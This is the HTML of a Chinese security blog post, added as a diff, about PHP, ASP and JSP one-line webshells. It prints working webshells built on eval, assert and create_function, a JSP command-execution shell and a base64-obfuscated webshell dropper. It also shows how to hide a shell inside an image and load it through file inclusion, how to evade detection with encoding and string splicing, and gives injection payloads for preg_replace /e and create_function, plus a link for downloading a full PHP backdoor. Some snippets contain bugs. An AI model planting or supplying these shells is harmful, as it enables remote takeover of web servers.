@@ -1,0 +1,440 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>命令执行与一句话木马 | h0ld1rs的随手记</title><meta name="author" content="h0ld1rs"><meta name="copyright" content="h0ld1rs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="对一句话木马的总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行与一句话木马">
+<meta property="og:url" content="https://h0ld1rs.github.io/2021/03/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/index.html">
+<meta property="og:site_name" content="h0ld1rs的随手记">
+<meta property="og:description" content="对一句话木马的总结">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://h0ld1rs.github.io/img/%E5%9B%BE%E5%BA%93/25.jpg">
+<meta property="article:published_time" content="2021-03-26T12:56:32.000Z">
+<meta property="article:modified_time" content="2021-07-31T09:50:41.464Z">
+<meta property="article:author" content="h0ld1rs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h0ld1rs.github.io/img/%E5%9B%BE%E5%BA%93/25.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://h0ld1rs.github.io/2021/03/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-31 17:50:41'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/%E5%9B%BE%E5%BA%93/25.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h0ld1rs的随手记</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">命令执行与一句话木马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-26T12:56:32.000Z" title="发表于 2021-03-26 20:56:32">2021-03-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-31T09:50:41.464Z" title="更新于 2021-07-31 17:50:41">2021-07-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在很多情况下，我们找到上传点，需要上传小马，来进行我们的后续操作，这里的小马，就是一句话木马。</p>
+<p>来看最简单的一句话木马。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;attack&#x27;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>@</code>是屏蔽报错，<code>POST</code>是发送数据的方式，<code>eval</code>是命令执行的函数，这么看，他大概分为三部分</p>
+<p>==程序语言的固定格式==  +  ==所对应程序语言能执行系统命令的函数(调用了对应的接口)== + ==传递数据的方式==</p>
+<blockquote>
+<p>所以稍后会讲命令执行的函数有哪些。</p>
+</blockquote>
+<h2 id="利用条件-文件上传"><a href="#利用条件-文件上传" class="headerlink" title="利用条件[文件上传]"></a>利用条件[文件上传]</h2><ol>
+<li>木马未被删除，成功上传到主机</li>
+<li>知道木马上传的绝对路径</li>
+<li>上传的木马能够在对方的环境下成功解析</li>
+</ol>
+<h2 id="常见的一句话木马"><a href="#常见的一句话木马" class="headerlink" title="常见的一句话木马"></a>常见的一句话木马</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line">jsp的一句话木马是：&lt;%</span><br><span class="line">if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());</span><br><span class="line"><span class="meta">%</span><span class="bash">&gt;<span class="comment">#jsp的有点难，，，以后专门分析一下</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//jsp木马的详细方式。</span></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;123&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="详细解释"><a href="#详细解释" class="headerlink" title="详细解释"></a>详细解释</h2><p>为什么一句话木马要加入<code>@</code>来屏蔽报错呢？</p>
+<p>因为没有定义呀。一个变量没有定义，就被拿去使用了。肯定会报错。</p>
+<blockquote>
+<?php $cmd='';eval($_POST(cmd);>这样定义其实就省去了定义@
+
+当我们在post数据里输入`cmd=system("xxx");`的时候，就相当于
+
+` <?php @eval(system("xxx"););?><p>`</p>
+<p><code>切记，一定要分号</code></p>
+</blockquote>
+<p>要是网站本身就定义了eval($_POST)，我们可以直接用工具连接，，，，，当然你得知道文件路径,,hhhhhhh</p>
+<h2 id="加强版例子"><a href="#加强版例子" class="headerlink" title="加强版例子"></a>加强版例子</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd=exec(<span class="string">&quot;ipconfig&quot;</span>,$out);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r($out);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>pre 元素可定义预格式化的文本。被包围在 pre 元素中的文本通常会保留空格和换行符。而文本也会呈现为等宽字体。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731174923.png"></p>
+<h2 id="一句话木马的工具"><a href="#一句话木马的工具" class="headerlink" title="一句话木马的工具"></a>一句话木马的工具</h2><p>市面上主流的一句话木马的工具有<code>中国菜刀，蚁剑，冰蝎</code>，知道上传成功后，即可采用工具连接，更方便。</p>
+<h2 id="一句话木马的变形"><a href="#一句话木马的变形" class="headerlink" title="一句话木马的变形"></a>一句话木马的变形</h2><h3 id="图片马-文件上传-文件包含"><a href="#图片马-文件上传-文件包含" class="headerlink" title="图片马[文件上传+文件包含]"></a>图片马[文件上传+文件包含]</h3><p>综上所述，一句话木马用在当我们可以上传文件的时候，但是，有的网站自然限制了上传文件的图片，那么，我们就可以做<code>图片马</code></p>
+<p>这个东西，是在大一时候<code>B站上，小甲鱼的C语言</code>第一次知道的。</p>
+<p>就是把两个文件的数据叠加到一起，更改后缀可以任意切换文件类型。</p>
+<blockquote>
+<p>文件头A+文件流A+文件尾A</p>
+<p>文件B同理</p>
+<p>使用命令 <code>copy</code> copy 木马.php/a+ 任意图片.jpg /b   muma.jpg</p>
+<p>“b”表示“<strong>二进制文件</strong>”    a”表示<strong>ASCII码文件</strong>。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731174948.png"></p>
+<p>这里说一下，虽然这里的<code>jpg</code>文件，已经包含进去了<code>php</code>的数据，但是后缀名还是<code>jpg</code>，导致无法被解析成<code>php</code>文件</p>
+<p>类似于<code>dvwa</code>的高难度一样，不是前端验证，于是无法通过抓包改包来达到目的。这时候就需要文件包含</p>
+<p><code>文件上传</code>+<code>文件包含</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;muma.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[hack]);?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用文件包含图片马后，就会在目录下多出<code>muma.php</code>,当然，文件包含以后，也可以直接在POST里请求命令。</p>
+<h1 id="木马免杀-简单思路"><a href="#木马免杀-简单思路" class="headerlink" title="木马免杀(简单思路)"></a>木马免杀(简单思路)</h1><p>一句话木马太简单了，特征太明显了，一般危险的函数都会被检测到，所以，除了命名要迷惑管理员或者隐藏外，我们还需要一些思路</p>
+<p><code>(内心os:只要思路宽，绕狗绕到欢)</code></p>
+<h2 id="将木马进行二次编码"><a href="#将木马进行二次编码" class="headerlink" title="将木马进行二次编码"></a>将木马进行二次编码</h2><p>如，base64，hex编码等，将关键代码放在乱七八糟的代码中进行绕过。避免waf识别</p>
+<h2 id="字符串不断拼接"><a href="#字符串不断拼接" class="headerlink" title="字符串不断拼接"></a>字符串不断拼接</h2><p>他还是一句话木马，不过是进行了好几次的拼接和转换。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $a1=<span class="string">&quot;ass&quot;</span>;</span><br><span class="line">    $a2=<span class="string">&quot;ert&quot;</span>;</span><br><span class="line">	$arry=<span class="keyword">array</span>($a1.$a2=&gt;<span class="string">&quot;test&quot;</span>);<span class="comment">//大家可以把这里var_dump出来看一下。</span></span><br><span class="line">	$arr1=array_flip($arr);</span><br><span class="line">	$arr2=$arr1[test];<span class="comment">//这里也var_dump打印出来看一下.这时候的$arr2[test]就是asasert</span></span><br><span class="line">	@arr2($_POST[cmd]);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这也算是一种免杀的思路吧。。只不过有点<code>low</code></p>
+<h1 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h1><blockquote>
+<p>大马的体积就比较大了，通常在50K左右，比小马会大好多倍，但对应的功能也很强大，包括对数据的管理，命令的操作，数据库的管理，解压缩，和提权等功能，都非常强大。这种大马一旦网站被种了，网站基本就在这个大马控制之中。大马的隐蔽性不好，因为涉及很多敏感代码，安全类程序很容易扫描到</p>
+</blockquote>
+<p>PHP大马：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1XGUp5Q_Q2zn46kcQxE5M3A">https://pan.baidu.com/s/1XGUp5Q_Q2zn46kcQxE5M3A</a></p>
+<p><code>提取码：56pd</code></p>
+<p>JSP大马：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34248023/article/details/93094456">https://blog.csdn.net/weixin_34248023/article/details/93094456</a></p>
+<p>以上资料参考于博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765">https://blog.csdn.net/weixin_39190897/article/details/86772765</a></p>
+<h1 id="后门执行函数"><a href="#后门执行函数" class="headerlink" title="后门执行函数"></a>后门执行函数</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>eval()函数会将传入的字符串当作PHP代码来执行</p>
+<p>所以最常见的也是一句话木马也是eval函数</p>
+<p><code>&lt;?php @eval($_REQUEST[&#39;pass&#39;]); ?&gt;</code></p>
+<blockquote>
+<p>这里采用了Request方法</p>
+<p>$_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件</p>
+<p>既可以在POST中传递 pass=xxxxx,也可以在get请求中输入参数?pass=xxxx</p>
+</blockquote>
+<h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><p>assert本身是断言函数，判断正确与否，但是当输入字符串的时候，会被当做代码执行。</p>
+<p>经过我的实验，<code>assert</code>本身只能执行函数。</p>
+<p>如果执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="keyword">echo</span> <span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>则是无输出的，但是执行 <code>phpinfo(),print_r等函数时，是可以输出的</code></p>
+<p>这是因为<code>echo 不是一个函数（它是一个语言结构）,</code>它接受参数列表，而且没有返回值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert($_REQUEST[<span class="string">&#x27;mm&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731175014.png"></p>
+<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p>==preg_replace — 执行一个正则表达式的搜索和替换==</p>
+<blockquote>
+<p>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</p>
+<p>搜索subject中匹配pattern的部分， 以replacement进行替换。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">&#x27;/test/e&#x27;</span>,$_REQUEST[<span class="string">&#x27;test&#x27;</span>],<span class="string">&#x27;just for test&#x27;</span>);</span><br><span class="line">等价于：</span><br><span class="line"><span class="keyword">eval</span>($_REQUEST[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>/test/e 中的 <code>e</code>是PCRE修饰符，其中的 <code>e</code>可以理解为<code>eval</code> 模式</p>
+</blockquote>
+<p>这个函数在<code>PHP 5.5.0</code>开始被建议禁用，在<code>PHP 7.0.0</code>后被弃用</p>
+<h3 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$html = $_REQUEST[<span class="string">&#x27;html&#x27;</span>];</span><br><span class="line"><span class="comment">// uppercase headings</span></span><br><span class="line">$html = preg_replace(</span><br><span class="line">    <span class="string">&#x27;(&lt;h([1-6])&gt;(.*?)&lt;/h\1&gt;)e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&quot;&lt;h$1&gt;&quot; . strtoupper(&quot;$2&quot;) . &quot;&lt;/h$1&gt;&quot;&#x27;</span>,</span><br><span class="line">    $html</span><br><span class="line">);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这时的<code>payload是</code> ==?html=<h1>${phpinfo()}</h1>==</p>
+<p>这里加密也是不错的手段。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fputs(fopen(base64_decode(<span class="string">&#x27;YmRiLnBocA==&#x27;</span>),<span class="string">&quot;w&quot;</span>),base64_decode(<span class="string">&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ20nXSk7Pz4=&#x27;</span>));</span><br><span class="line"><span class="comment">//base64_decode(&#x27;YmRiLnBocA==&#x27;) ==&gt;bdb.php</span></span><br><span class="line"><span class="comment">//base64_decode(&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ20nXSk7Pz4=&#x27;)==&gt;<span class="meta">&lt;?php</span> eval($_POST[&#x27;m&#x27;]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><blockquote>
+<p>create_function（PHP 4&gt; = 4.0.1，PHP 5，PHP 7）<br>create_function — 创建一个匿名（lambda样式）函数</p>
+<p>从<code>PHP 7.2.0</code>开始，<code>create_function()</code>被废弃</p>
+</blockquote>
+<p>==此函数在内部执行eval（），因此具有与eval（）相同的安全性问题。==</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sort_by = $_GET[<span class="string">&#x27;sort_by&#x27;</span>];</span><br><span class="line">$sorter = <span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line">$databases=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line">$sort_function = <span class="string">&#x27; return 1 * &#x27;</span> . $sorter . <span class="string">&#x27;($a[&quot;&#x27;</span> . $sort_by . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . $sort_by . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line">usort($databases, create_function(<span class="string">&#x27;$a, $b&#x27;</span>, $sort_function));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload:<code>?sort_by=&#39;&quot;]);&#125;phpinfo();/*</code></p>
+<p>实际的组合过程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sort_function = <span class="string">&#x27; return 1 * &#x27;</span> . $sorter . <span class="string">&#x27;($a[&quot;&#x27;</span> . $sort_by <span class="string">&#x27;&quot;]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
+
+<p>匿名函数实际的执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params">$a,$b</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span> * <span class="string">&#x27; . $sorter . &#x27;</span>($a[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> &#x27;&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用的漏洞：==WordPress &lt;= 4.6.1 使用语言文件任意代码执行漏洞==</p>
+<hr>
+<p>我么可以此函数构造出这样的一句话木马。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $s=create_function(<span class="string">&#x27;&#x27;</span>,$_REQUEST[<span class="string">&#x27;mm&#x27;</span>]);$s();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?mm=system(whoami);</span><br></pre></td></tr></table></figure>
+
+<h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h2><p>array_map()为数组的每个元素应用回调函数</p>
+<p><code>array_map ( callable $callback , array $array1 [, array $... ] ) : array</code></p>
+<p>利用原理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $old_array = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">$arg</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $arg + $arg;</span><br><span class="line">    &#125;</span><br><span class="line">    $new_array = array_map(<span class="string">&#x27;func&#x27;</span>,$old_array);</span><br><span class="line">    var_dump($new_array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//func 是执行的</span></span><br></pre></td></tr></table></figure>
+
